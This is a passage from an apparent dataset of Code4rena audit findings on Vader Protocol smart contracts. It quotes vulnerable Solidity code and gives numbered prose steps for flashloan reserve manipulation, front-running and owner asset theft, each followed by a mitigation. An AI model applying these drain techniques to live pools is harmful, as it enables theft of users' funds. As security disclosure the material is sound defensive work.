shares proportionally to current reserves (NFT mint, notice the reserveNative, which is BasePoolV2's pair.reserveNative, total amount of native asset in the Pool):\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L497>\n\nWhen LP exits, it gets a proportion of current reserves back (NFT burn):\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L223>\n\nThe same happens when fungible LP mints (same reserveNative):\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L336>\nAnd burns:\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L401>\n\n#### Recommended Mitigation Steps\n\nAccount for LP provided liquidity separately from total amount variables, i.e. use only LP provided native reserves variables in LP shares mint and burn calculations.\nThat should suffice as total amount of native assets is still to be used elsewhere, whenever the whole pool is concerned, for example, in rescue function, swap calculations and so forth.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/179)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about an issue that occurs when users mint synths, which are digital assets, and provide native assets, such as USDV, to the system. Normally, when a non-synth liquidity provider exits the system, they receive a proportion of all current reserves. However, in this case, when a non-synth liquidity provider exits, they receive a proportion of the native assets provided by synth minters, resulting in less native assets available to reimburse the synth minters. This is not reversible and causes the synth minters to lose their native assets to the liquidity provider. The report suggests that the issue can be fixed by accounting for the liquidity provided by non-synth LPs separately from the total amount of native assets in the system. The team behind the system has acknowledged the issue and is working on a solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/179",
      "tags": [],
      "finders": []
    },
    {
      "id": "42425",
      "title": "[H-11] `totalLiquidityWeight` Is Updated When Adding New Token Pairs Which Skews Price Data For `getVaderPrice` and `getUSDVPrice`",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\nThe `_addVaderPair` function is called by the `onlyOwner` role. The relevant data in the `twapData` mapping is set by querying the respective liquidity pool and Chainlink oracle. `totalLiquidityWeight` for the `VADER` path is also incremented by the `pairLiquidityEvaluation` amount (calculated within `_addVaderPair`). If a user then calls `syncVaderPrice`, the recently updated `totalLiquidityWeight` will be taken into consideration when iterating through all token pairs eligible for price updates to calculate the liquidity weight for each token pair. This data is stored in `pastTotalLiquidityWeight` and `pastLiquidityWeights` respectively.\n\nAs a result, newly added token pairs will increase `pastTotalLiquidityWeight` while leaving `pastLiquidityWeights` underrepresented. This only occurs if `syncVaderPrice` is called before the update period for the new token has not been passed.\n\nThis issue also affects how the price for `USDV` is synced.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L299>\n\n    function _addVaderPair(\n        IUniswapV2Pair pair,\n        IAggregatorV3 oracle,\n        uint256 updatePeriod\n    ) internal {\n        require(\n            updatePeriod != 0,\n            \"LBTWAP::addVaderPair: Incorrect Update Period\"\n        );\n\n        require(oracle.decimals() == 8, \"LBTWAP::addVaderPair: Non-USD Oracle\");\n\n        ExchangePair storage pairData = twapData[address(pair)];\n\n        bool isFirst = pair.token0() == vader;\n\n        (address nativeAsset, address foreignAsset) = isFirst\n            ? (pair.token0(), pair.token1())\n            : (pair.token1(), pair.token0());\n\n        oracles[foreignAsset] = oracle;\n\n        require(nativeAsset == vader, \"LBTWAP::addVaderPair: Unsupported Pair\");\n\n        pairData.foreignAsset = foreignAsset;\n        pairData.foreignUnit = uint96(\n            10**uint256(IERC20Metadata(foreignAsset).decimals())\n        );\n\n        pairData.updatePeriod = updatePeriod;\n        pairData.lastMeasurement = block.timestamp;\n\n        pairData.nativeTokenPriceCumulative = isFirst\n            ? pair.price0CumulativeLast()\n            : pair.price1CumulativeLast();\n\n        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();\n\n        (uint256 reserveNative, uint256 reserveForeign) = isFirst\n            ? (reserve0, reserve1)\n            : (reserve1, reserve0);\n\n        uint256 pairLiquidityEvaluation = (reserveNative *\n            previousPrices[uint256(Paths.VADER)]) +\n            (reserveForeign * getChainlinkPrice(foreignAsset));\n\n        pairData.pastLiquidityEvaluation = pairLiquidityEvaluation;\n\n        totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;\n\n        vaderPairs.push(pair);\n\n        if (maxUpdateWindow < updatePeriod) maxUpdateWindow = updatePeriod;\n    }\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L113-L148>\n\n    function syncVaderPrice()\n        public\n        override\n        returns (\n            uint256[] memory pastLiquidityWeights,\n            uint256 pastTotalLiquidityWeight\n        )\n    {\n        uint256 _totalLiquidityWeight;\n        uint256 totalPairs = vaderPairs.length;\n        pastLiquidityWeights = new uint256[](totalPairs);\n        pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];\n\n        for (uint256 i; i < totalPairs; ++i) {\n            IUniswapV2Pair pair = vaderPairs[i];\n            ExchangePair storage pairData = twapData[address(pair)];\n            uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;\n\n            if (timeElapsed < pairData.updatePeriod) continue;\n\n            uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;\n            uint256 currentLiquidityEvaluation = _updateVaderPrice(\n                pair,\n                pairData,\n                timeElapsed\n            );\n\n            pastLiquidityWeights[i] = pastLiquidityEvaluation;\n\n            pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;\n\n            _totalLiquidityWeight += currentLiquidityEvaluation;\n        }\n\n        totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight;\n    }\n\nAs shown above, `pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)]` loads in the total liquidity weight which is updated when `_addVaderPair` is called. However, `pastLiquidityWeights` is calculated by iterating through each token pair that is eligible to be updated.\n\n#### Recommended Mitigation Steps\n\nConsider removing the line `totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;` in `_addVaderPair` so that newly added tokens do not impact upcoming queries for `VADER/USDV` price data. This should ensure `syncVaderPrice` and `syncUSDVPrice` cannot be manipulated when adding new tokens.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-12-vader-findings/issues/105)**\n\n\n\n***\n\n",
      "summary": "\nThe `_addVaderPair` function is causing an issue where newly added token pairs are not being properly represented in the `pastLiquidityWeights` data, affecting the `USDV` price sync. This happens when `syncVaderPrice` is called before the update period for the new token has passed. The recommended mitigation is to remove a specific line of code in `_addVaderPair` to prevent the manipulation of `syncVaderPrice` and `syncUSDVPrice` when adding new tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/105",
      "tags": [],
      "finders": []
    },
    {
      "id": "42424",
      "title": "[H-10] `previousPrices` Is Never Updated Upon Syncing Token Price",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\nThe `LiquidityBasedTWAP` contract attempts to accurately track the price of `VADER` and `USDV` while still being resistant to flash loan manipulation and short-term volatility. The `previousPrices` array is meant to track the last queried price for the two available paths, namely `VADER` and `USDV`.\n\nThe `setupVader` function configures the `VADER` token by setting `previousPrices` and adding a token pair. However, `syncVaderPrice` does not update `previousPrices` after syncing, causing `currentLiquidityEvaluation` to be dependent on the initial price for `VADER`. As a result, liquidity weightings do not accurately reflect the current and most up to date price for `VADER`.\n\nThis same issue also affects how `USDV` calculates `currentLiquidityEvaluation`.\n\nThis issue is of high risk and heavily impacts the accuracy of the TWAP implementation as the set price for `VADER/USDV` diverges from current market prices. For example, as the Chainlink oracle price and initial price for `VADER` diverge, `currentLiquidityEvaluation` will begin to favour either on-chain or off-chain price data depending on which price result is greater. The following calculation for `currentLiquidityEvaluation` outlines this behaviour.\n\n    currentLiquidityEvaluation =\n        (reserveNative * previousPrices[uint256(Paths.VADER)]) +\n        (reserveForeign * getChainlinkPrice(pairData.foreignAsset));\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L150-L189>\n\n    function _updateVaderPrice(\n        IUniswapV2Pair pair,\n        ExchangePair storage pairData,\n        uint256 timeElapsed\n    ) internal returns (uint256 currentLiquidityEvaluation) {\n        bool isFirst = pair.token0() == vader;\n\n        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();\n\n        (uint256 reserveNative, uint256 reserveForeign) = isFirst\n            ? (reserve0, reserve1)\n            : (reserve1, reserve0);\n\n        (\n            uint256 price0Cumulative,\n            uint256 price1Cumulative,\n            uint256 currentMeasurement\n        ) = UniswapV2OracleLibrary.currentCumulativePrices(address(pair));\n\n        uint256 nativeTokenPriceCumulative = isFirst\n            ? price0Cumulative\n            : price1Cumulative;\n\n        unchecked {\n            pairData.nativeTokenPriceAverage = FixedPoint.uq112x112(\n                uint224(\n                    (nativeTokenPriceCumulative -\n                        pairData.nativeTokenPriceCumulative) / timeElapsed\n                )\n            );\n        }\n\n        pairData.nativeTokenPriceCumulative = nativeTokenPriceCumulative;\n\n        pairData.lastMeasurement = currentMeasurement;\n\n        currentLiquidityEvaluation =\n            (reserveNative * previousPrices[uint256(Paths.VADER)]) +\n            (reserveForeign * getChainlinkPrice(pairData.foreignAsset));\n    }\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L221-L235>\n\n    function setupVader(\n        IUniswapV2Pair pair,\n        IAggregatorV3 oracle,\n        uint256 updatePeriod,\n        uint256 vaderPrice\n    ) external onlyOwner {\n        require(\n            previousPrices[uint256(Paths.VADER)] == 0,\n            \"LBTWAP::setupVader: Already Initialized\"\n        );\n\n        previousPrices[uint256(Paths.VADER)] = vaderPrice;\n\n        _addVaderPair(pair, oracle, updatePeriod);\n    }\n\n#### Recommended Mitigation Steps\n\nConsider updating `previousPrices[uint256(Paths.VADER)]` and `previousPrices[uint256(Paths.USDV)]` after syncing the respective prices for the two tokens. This will ensure the most up to date price is used when evaluating liquidity for all available token pairs.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/103)**\n\n\n\n***\n\n",
      "summary": "\nThe `LiquidityBasedTWAP` contract is designed to track the prices of `VADER` and `USDV` accurately while also being resistant to manipulation and short-term volatility. However, there is a bug in the contract that affects the accuracy of the price tracking. The `previousPrices` array is not being updated correctly, which means that the current price of `VADER` and `USDV` is not being reflected accurately in the liquidity weightings. This issue can lead to a divergence between the set price and the actual market price, which can cause problems with the TWAP implementation. The bug has been acknowledged by the team and a potential solution has been recommended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/103",
      "tags": [],
      "finders": []
    },
    {
      "id": "42423",
      "title": "[H-09] `USDV.sol` Mint and Burn Amounts Are Incorrect",
      "impact": "HIGH",
      "content": "_Submitted by leastwood, also found by TomFrenchBlockchain_\n\nThe `USDV.mint` function queries the price of `Vader` from the `LiquidityBasedTwap` contract. The calculation to determine `uAmount` in `mint` is actually performed incorrectly. `uAmount = (vPrice * vAmount) / 1e18;` will return the `USD` amount for the provided `Vader` as `vPrice` is denominated in `USD/Vader`. This `uAmount` is subsequently used when minting tokens for the user (locked for a period of time) and fee to the contract owner.\n\nThis same issue also applies to how `vAmount = (uPrice * uAmount) / 1e18;` is calculated in `USDV.burn`.\n\nThis is a severe issue, as the `mint` and `burn` functions will always use an incorrect amount of tokens, leading to certain loss by either the protocol (if the user profits) or the user (if the user does not profit).\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L66-L98>\n\n    function mint(uint256 vAmount)\n        external\n        onlyWhenNotLocked\n        returns (uint256 uAmount)\n    {\n        uint256 vPrice = lbt.getVaderPrice();\n\n        vader.transferFrom(msg.sender, address(this), vAmount);\n        vader.burn(vAmount);\n\n        uAmount = (vPrice * vAmount) / 1e18;\n\n        if (cycleTimestamp <= block.timestamp) {\n            cycleTimestamp = block.timestamp + 24 hours;\n            cycleMints = uAmount;\n        } else {\n            cycleMints += uAmount;\n            require(\n                cycleMints <= dailyLimit,\n                \"USDV::mint: 24 Hour Limit Reached\"\n            );\n        }\n\n        if (exchangeFee != 0) {\n            uint256 fee = (uAmount * exchangeFee) / _MAX_BASIS_POINTS;\n            uAmount = uAmount - fee;\n            _mint(owner(), fee);\n        }\n\n        _mint(address(this), uAmount);\n\n        _createLock(LockTypes.USDV, uAmount);\n    }\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L100-L120>\n\n    function burn(uint256 uAmount)\n        external\n        onlyWhenNotLocked\n        returns (uint256 vAmount)\n    {\n        uint256 uPrice = lbt.getUSDVPrice();\n\n        _burn(msg.sender, uAmount);\n\n        vAmount = (uPrice * uAmount) / 1e18;\n\n        if (exchangeFee != 0) {\n            uint256 fee = (vAmount * exchangeFee) / _MAX_BASIS_POINTS;\n            vAmount = vAmount - fee;\n            vader.mint(owner(), fee);\n        }\n\n        vader.mint(address(this), vAmount);\n\n        _createLock(LockTypes.VADER, vAmount);\n    }\n\n#### Recommended Mitigation Steps\n\nConsider utilising both `getVaderPrice` and `getUSDVPrice` when calculating the expected `uAmount` and `vAmount` to mint or burn. To calculate `uAmount` in `mint`, `vPrice` should be denominated in `USDV/Vader`. To calculate `vAmount` in `burn`, `uPrice` should be denominated in `Vader/USDV`. It would be useful to add unit tests to test this explicitly as it is expected that users will interact with the `USDV.sol` contract frequently.\n\n**[0xstormtrooper (Vader) disputed and commented](https://github.com/code-423n4/2021-12-vader-findings/issues/164#issuecomment-1001314244):**\n > Mint / burn calculation with USD is intentional, modeled after LUNA / UST.\n> \n> Mint USDV<br>\n> 1 USD worth of Vader should mint 1 USDV\n> \n> Burn USDV<br>\n> 1 USDV should mint 1 USD worth of Vader\n> \n> https://docs.terra.money/Concepts/Protocol.html#expansion-and-contraction\n\n\n\n***\n\n",
      "summary": "\nThe `USDV.mint` function in the `USDV.sol` contract has a calculation error that affects the `uAmount` and `vAmount` values. This leads to incorrect amounts of tokens being minted or burned, resulting in loss for either the protocol or the user. The recommended solution is to use both `getVaderPrice` and `getUSDVPrice` when calculating these values and to add unit tests to ensure proper functionality. A comment from the Vader team disputes this issue, stating that the calculation is intentional and based on the LUNA / UST model.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/164",
      "tags": [],
      "finders": []
    },
    {
      "id": "42422",
      "title": "[H-07] Redemption value of synths can be manipulated to drain `VaderPoolV2` of all native assets in the associated pair",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain, also found by certora_\n\nDraining of funds from `VaderPoolV2`.\n\n#### Proof of Concept\n\nSee the `VaderPool.mintSynth` function:\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L153-L194>\n\nAs the pool's reserves can be manipulated through flashloans similar to on UniswapV2 (the slip mechanism can be mitigated by splitting the manipulation over a number of trades), an attacker may set the exchange rate between `nativeAsset` and synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.\n\n1.  The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. The pool now thinks `nativeAsset` is extremely valuable.\n2.  The attacker now uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable the attacker will receive a huge amount of synths.\n3.  The attacker can now manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. `nativeAsset` is now back at its normal price, or perhaps artificially low if the attacker wishes.\n4.  The attacker now burns all of their synths. As `nativeAsset` is considered much less valuable than at the point the synths were minted it takes a lot more of `nativeAsset` in order to pay out for the burned synths.\n\nFor the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable.\n\n#### Recommended Mitigation Steps\n\nTie the exchange rate use for minting/burning synths to a manipulation resistant oracle.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/5)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the `VaderPoolV2` contract, which allows an attacker to manipulate the exchange rate between `nativeAsset` and synths, resulting in the draining of funds from the pool. The attacker can achieve this by using a flashloan and manipulating the pool's reserves, causing the pool to think that `nativeAsset` is extremely valuable. They can then mint a large amount of synths and manipulate the pool in the opposite direction, buying back the `foreignAsset` they sold earlier. This allows the attacker to extract a significant amount of `nativeAsset` from the pool. The report recommends tying the exchange rate to a manipulation-resistant oracle as a mitigation step. The project team has acknowledged the issue and is working on a solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/5",
      "tags": [],
      "finders": []
    },
    {
      "id": "42421",
      "title": "[H-06] LPs of `VaderPoolV2` can manipulate pool reserves to extract funds from the reserve.",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain, also found by hyh_\n\nImpermanent loss protection can be exploited to drain the reserve.\n\n#### Proof of Concept\n\nIn `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L265-L296>\n\nThese losses are then refunded to the LP in VADER tokens from the reserve.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/router/VaderRouterV2.sol#L220>\n\nThis loss is calculated by the current reserves of the pool so if an LP can manipulate the pool's reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/math/VaderMath.sol#L72-L92>\n\nThe attack is then as follows.\n\n1.  Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)\n2.  Flashloan a huge amount of one of the pool's assets.\n3.  Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.\n4.  Remove your liquidity and receive compensation from the reserve for the IL you have engineered.\n5.  Re-add your liquidity back to the pool.\n6.  Trade against the pool to bring it back into balance.\n\nThe attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.\n\nThis is a high risk issue as after a year any large LP is incentivised and able to perform this attack and drain reserve funds.\n\n#### Recommended Mitigation Steps\n\nUse a manipulation resistant oracle for the relative prices of the pool's assets (TWAP, etc.)\n\n\n\n***\n\n",
      "summary": "\nThe Impermanent Loss Protection feature in the VaderPoolV2 contract can be exploited to drain the reserve. This is done by manipulating the pool's reserves and engineering a large amount of Impermanent Loss in order to receive a payout from the reserve. The attack involves being an LP for a period of time, using a flashloan to unbalance the pool, and then removing and re-adding liquidity to receive compensation from the reserve. This can lead to a large profit for the attacker. It is recommended to use a manipulation-resistant oracle for the pool's asset prices to mitigate this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/55",
      "tags": [],
      "finders": []
    },
    {
      "id": "42420",
      "title": "[H-03] Oracle doesn't calculate USDV/VADER price correctly",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain, also found by danb and leastwood_\n\nInvalid values returned from oracle for USDV and VADER prices in situations where the oracle uses more than one foreign asset.\n\n#### Proof of Concept\n\nThe USDV price is calculated as so (for simplicity we'll consider a two pairs):\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409>\n\n    totalUSD =  (PriceForeign0InUSD * liquidityWeights[0] + PriceForeign1InUSD * liquidityWeights[1]) / totalUSDVLiquidityWeight;\n\n`totalUSD` is then the average price of the foreign assets paired against USDV in terms of USD, weighted by the TVL of the relevant liquidity pool\n\n    totalUSDV =\n      (pairData0\n          .nativeTokenPriceAverage\n          .mul(pairData0.foreignUnit)\n          .decode144() * liquidityWeights[0] +\n       pairData1\n          .nativeTokenPriceAverage\n          .mul(pairData1.foreignUnit)\n          .decode144() * liquidityWeights[1]) /\n      totalUSDVLiquidityWeight;\n\n    // in pseudocode for readability\n    totalUSDV = (USDVPriceInForeign0 * liquidityWeights[0] + USDVPriceInForeign1 * liquidityWeights[1]) /  totalUSDVLiquidityWeight\n\n`totalUSDV` is then the average price of USDV in terms of each of the foreign assets, weighted by the TVL of the relevant liquidity pool.\n\nIt should be fairly clear that this is the incorrect calculation as all the terms in `totalUSDV` are in different units - you can't average the price of USDV in ETH with the price of USDV in BTC and get a meaningful result.\n\nIt appears that the VADER team intended to calculate the price of USDV in terms of USD through a number of different paired assets and then average them at the end based on the liquidity in each pair but have started averaging too early.\n\nHigh severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.\n\n#### Recommended Mitigation Steps\n\nReview the algorithm used for calculating the prices of assets and ensure that it's calculating what you expect.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/42)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the calculation of prices for USDV and VADER in a blockchain project. The project's oracle, which determines the exchange rate between VADER and USDV, is returning incorrect values in situations where it uses more than one foreign asset. This is a high severity issue as it can result in the protocol losing significant funds. The recommended mitigation steps include reviewing the algorithm used for calculating prices and ensuring that it is accurate. The VADER team has acknowledged the issue and is working on resolving it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/42",
      "tags": [],
      "finders": []
    },
    {
      "id": "42419",
      "title": "[H-02] `VaderPoolV2` owner can steal all user assets which are approved `VaderPoolV2`",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\nPossible theft of all user assets with an ERC20 approval on VaderPoolV2.\n\n#### Proof of Concept\n\nThe owner of `VaderPoolV2` can call the `setTokenSupport` function which allows the caller to supply any address from which to take the assets to provide the initial liquidity, the owner can also specify who shall receive the resulting LP NFT and so can take ownership over these assets. This call will succeed for any address which has an ERC20 approval on `VaderPoolV2` for USDV and `foreignAsset`.\n\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L442-L474>\n\nThis in effect gives custody over all assets in user wallets which are approved on `VaderPoolV2` to Vader Protocol governance. This is especially problematic in the case of Vader Protocol as there's a single entity (i.e. the Council) which can force through a proposal to steal these assets for themselves with only the timelock giving protection to users, for this reason I give this high severity.\n\n#### Recommended Mitigation Steps\n\nEnforce that the initial liquidity is provided by the VaderPoolV2 owner.\n\n\n\n***\n\n",
      "summary": "\nPossible Theft of User Assets on VaderPoolV2 with ERC20 Approval\n\nThis bug report highlights a potential vulnerability in the VaderPoolV2 smart contract, which could lead to the theft of user assets. The issue lies in the `setTokenSupport` function, which allows the contract owner to specify any address to provide initial liquidity and receive LP NFTs. This means that the contract owner can take ownership of all assets approved on the contract by users. This is a high severity issue as there is a single entity, the Council, that can force through a proposal to steal these assets. The recommended mitigation step is to ensure that the initial liquidity is provided by the contract owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/72",
      "tags": [],
      "finders": []
    },
    {
      "id": "42418",
      "title": "[H-01] `VaderPoolV2` minting synths & fungibles can be frontrun",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by cccz, Critical, danb, leastwood, and TomFrenchBlockchain_\n\nThe `VaderPoolV2` `mintFungible` and `mintSynth` functions perform an unsafe `nativeAsset.safeTransferFrom(from, address(this), nativeDeposit)` with a parameter-specified `from` address.\n\nNote that these functions are not called by the Router, they are directly called on the pool.\nTherefore, users will usually be required to send two transactions, a first one approving the pool, and then a second one for the actual `mintSynth`.\n\nAn attacker can frontrun the `mintSynth(IERC20 foreignAsset, uint256 nativeDeposit, address from, address to)` function, use the same `from=victim` parameter but change the `to` parameter to the attacker.\n\n#### Impact\n\nIt's possible to frontrun victims stealing their native token deposits and receiving synths / fungible tokens.\n\n#### Recommended Mitigation Steps\n\nRemove the `from` parameter and always perform the `safeTransferFrom` call with `from=msg.sender`.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/147)**\n\n\n\n***\n\n",
      "summary": "\nA group of users found a problem in the `VaderPoolV2` code, specifically in the `mintFungible` and `mintSynth` functions. These functions use a `safeTransferFrom` method with a specified `from` address, which can be unsafe. This means that someone could potentially steal other users' tokens by changing the `to` address. The problem can be avoided by removing the `from` parameter and always using `msg.sender` instead. The developers have acknowledged the issue and are working to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/147",
      "tags": [],
      "finders": []
    },
    {
      "id": "5246",
      "title": "[M-01] VaderPoolV2.mintFungible exposes users to unlimited slippage",
      "impact": "MEDIUM",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n## Impact\n\nFrontrunners can extract up to 100% of the value provided by LPs to VaderPoolV2 as fungible liquidity.\n\n## Proof of Concept\n\nUsers can provide liquidity to `VaderPoolV2` through the `mintFungible` function.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L311-L317\n\nThis allows users to provide tokens in any ratio and the pool will calculate what fraction of the value in the pool this makes up and mint the corresponding amount of liquidity units as an ERC20.\n\nHowever there's no way for users to specify the minimum number of liquidity units they will accept. As the number of liquidity units minted is calculated from the current reserves, this allows frontrunners to manipulate the pool's reserves in such a way that the LP receives fewer liquidity units than they should. e.g. LP provides a lot of `nativeAsset` but very little `foreignAsset`, the frontrunner can then sell a lot of `nativeAsset` to the pool to devalue it.\n\nOnce this is done the attacker returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liquidity.\n\n## Recommended Mitigation Steps\n\nAdd a user-specified minimum amount of LP tokens to mint.",
      "summary": "\nThis bug report is about a vulnerability in the code of VaderPoolV2, a decentralized exchange protocol. This vulnerability allows frontrunners to extract up to 100% of the value provided by liquidity providers (LPs) to VaderPoolV2 as fungible liquidity. This is done by manipulating the pool's reserves in such a way that the LP receives fewer liquidity units than they should. The attacker then returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liquidity. The recommended mitigation to this vulnerability is to add a user-specified minimum amount of LP tokens to mint. This way, the attacker will not be able to manipulate the pool's reserves and the LP will receive the appropriate amount of liquidity units.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/2",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain",
        "pauliax  robee"
      ]
    },
    {
      "id": "1253",
      "title": "[M-06] Oracle can be manipulted to consider only a single pair for pricing",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\nLoss of resilience of oracle to a faulty pricing for a single pair.\n\n#### Proof of Concept\n\nIn the oracle we calculate the TVL of each pool by pulling the reserves and multiplying both assets by the result of a supposedly manipulation resistant oracle (the oracle queries its previous value for USDV and pulls the foreign asset from chainlink).\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/lbt/LiquidityBasedTWAP.sol#L353-L383>\n\nThis value can be manipulated by skewing the reserves of the underlying pair with a flashloan attack. An attacker can then make a pool appear with an arbitrarily large `currentLiquidityEvaluation` which will result in all other pairs contributing negligibly to the final result of the oracle.\n\nThis doesn't result in loss of funds by itself afaict but should there be an issue for the chainlink price feed for the asset in any pool then an attacker can force the oracle to only use that pool for pricing USDV/VADER\n\nMedium risk as \"Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\" External requirements being a malfunctioning or deprecated chainlink pricefeed for any used asset.\n\nCalculating TVL of the pool is 